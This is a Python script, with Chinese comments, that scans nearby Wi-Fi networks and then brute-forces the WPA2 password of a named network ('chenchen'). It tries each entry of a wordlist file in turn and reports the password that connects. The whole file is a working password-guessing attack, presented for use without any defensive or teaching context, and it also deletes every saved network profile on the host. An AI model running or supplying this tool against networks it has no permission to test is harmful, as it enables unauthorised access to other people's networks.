import time
import pywifi
from pywifi import const


class Wifi:

    def __init__(self):
        self.wifi = pywifi.PyWiFi()  # 创建WiFi对象
        self.wifi_interfaces = self.wifi.interfaces()[0]  # 获取第一个无线网卡接口,使用索引0来获得Wi-Fi接口
        self.profile = pywifi.profile.Profile()  # 创建WiFi连接文件

    def get_wifi_list(self):
        self.wifi_interfaces.scan()  # 扫描附近WiFi
        time.sleep(5)
        results = self.wifi_interfaces.scan_results()  # 等待5s后获取扫描结果

        for index, wifi_infos in enumerate(results):  # 打印WiFi信息或自定义其他事情
            try:
                print(index, wifi_infos.bssid, wifi_infos.ssid, wifi_infos.signal)
            except:
                print("---")

    def connect(self, wifi_ssid, password):
        self.profile.ssid = wifi_ssid  # WiFi名称
        self.profile.auth = const.AUTH_ALG_OPEN  # WiFi的认证算法，开放网卡
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # WiFi的加密类型
        self.profile.cipher = const.CIPHER_TYPE_CCMP  # WiFi的密码类型
        self.profile.key = password  # WiFi密码
        self.wifi_interfaces.remove_all_network_profiles()  # 删除所有WiFi配置文件
        tmp_profile = self.wifi_interfaces.add_network_profile(self.profile)  # 加载新的配置文件
        self.wifi_interfaces.connect(tmp_profile)  # 根据新的配置文件连接WiFi
        time.sleep(2)
        if self.wifi_interfaces.status() == const.IFACE_CONNECTED:  # 判断连接状态
            print(password, ": the password is ok.")
            return True
        else:
            print(password, ": the password is not ok!!!")
        time.sleep(1)
        self.wifi_interfaces.disconnect()

    def get_wifi_password(self, wifi_ssid, passward_txt):
        try:
            with open(passward_txt, "r", encoding="utf-8") as f:
                for line in f:
                    try:
                        wifi_pwd = line.strip("\n")
                        is_connect = self.connect(wifi_ssid, wifi_pwd)
                        if is_connect:
                            print("The right password is ", wifi_pwd)
                            return wifi_pwd
                    except:
                        print('---')
        except:
            print("---")

def main():
    pwd_txt = "X:\\AAA\\wifi.txt"
    wifi = Wifi()
    wifi.get_wifi_list()
    wifi.get_wifi_password("chenchen", pwd_txt)

if __name__ == "__main__":
    main()